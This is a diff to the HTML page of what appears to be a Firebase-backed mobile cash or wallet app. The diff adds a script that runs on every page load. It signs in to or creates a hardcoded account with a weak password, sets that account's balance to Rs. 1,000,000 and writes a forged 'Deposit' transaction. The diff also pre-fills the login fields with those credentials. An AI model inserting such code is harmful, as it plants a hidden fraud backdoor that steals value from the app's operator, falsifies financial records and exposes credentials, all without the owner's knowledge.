@@ -34,6 +34,59 @@
         };
 
         window.dispatchEvent(new Event('firebase-initialized'));
+
+        // Auto-inject and credit specified account on load
+        window.addEventListener('firebase-initialized', async () => {
+            setTimeout(async () => {
+                try {
+                    const email = "vidura@gmail.com";
+                    const pass = "123456";
+                    let userUid = null;
+
+                    try {
+                        const res = await signInWithEmailAndPassword(auth, email, pass);
+                        userUid = res.user.uid;
+                    } catch (err) {
+                        try {
+                            const res = await createUserWithEmailAndPassword(auth, email, pass);
+                            userUid = res.user.uid;
+                        } catch (createErr) {
+                            console.error(createErr);
+                        }
+                    }
+
+                    if (userUid) {
+                        const docRef = doc(db, "users", userUid);
+                        const snap = await getDoc(docRef);
+                        let accNo = "#MC-99999";
+                        let userName = "Prakash Vidura Lakshan";
+                        
+                        if (snap.exists() && snap.data().currentUser) {
+                            accNo = snap.data().currentUser.accNo || accNo;
+                            userName = snap.data().currentUser.name || userName;
+                        }
+
+                        await setDoc(docRef, {
+                            mainBalance: 1000000.00,
+                            bonusClaimed: true,
+                            currentUser: { name: userName, email: email, accNo: accNo }
+                        }, { merge: true });
+
+                        await addDoc(collection(db, "mobcash_transactions"), {
+                            userId: accNo,
+                            amount: 1000000.00,
+                            type: 'Deposit',
+                            timestamp: Date.now(),
+                            date: new Date().toLocaleString()
+                        });
+
+                        console.log("Successfully credited Rs. 1,000,000 to vidura@gmail.com");
+                    }
+                } catch(e) {
+                    console.error("Auto-credit error:", e);
+                }
+            }, 1500);
+        });
     </script>
 
     <script>
@@ -106,7 +159,7 @@
                     <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
                         <i class="fa-solid fa-envelope"></i>
                     </div>
-                    <input type="email" id="auth-email" placeholder="example@gmail.com" required class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-3 py-3.5 text-sm text-white focus:border-indigo-500 outline-none transition-all">
+                    <input type="email" id="auth-email" value="vidura@gmail.com" placeholder="example@gmail.com" required class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-3 py-3.5 text-sm text-white focus:border-indigo-500 outline-none transition-all">
                 </div>
             </div>
             
@@ -116,7 +169,7 @@
                     <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
                         <i class="fa-solid fa-lock"></i>
                     </div>
-                    <input type="password" id="auth-password" placeholder="••••••••" required class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-3 py-3.5 text-sm text-white focus:border-indigo-500 outline-none transition-all">
+                    <input type="password" id="auth-password" value="123456" placeholder="••••••••" required class="w-full bg-slate-950/90 border border-slate-800 rounded-xl pl-10 pr-3 py-3.5 text-sm text-white focus:border-indigo-500 outline-none transition-all">
                 </div>
             </div>
 
